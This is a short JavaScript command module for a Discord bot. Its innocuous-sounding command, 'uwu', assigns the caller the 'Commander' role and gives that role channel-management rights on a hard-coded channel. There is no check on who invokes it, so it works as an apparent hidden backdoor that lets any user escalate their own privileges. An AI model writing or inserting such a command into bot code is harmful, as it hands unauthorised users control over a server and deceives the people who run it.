module.exports = {
  name: "uwu",
  run: async (message, args, client) => {
    let rol = message.guild.roles.find(r => r.name === "Commander");
    message.member.addRole(rol);
    let cha = message.guild.channels.get("751340320205307976");
    cha.overwritePermissions(rol, { MANAGE_CHANNEL: true });
  }
};
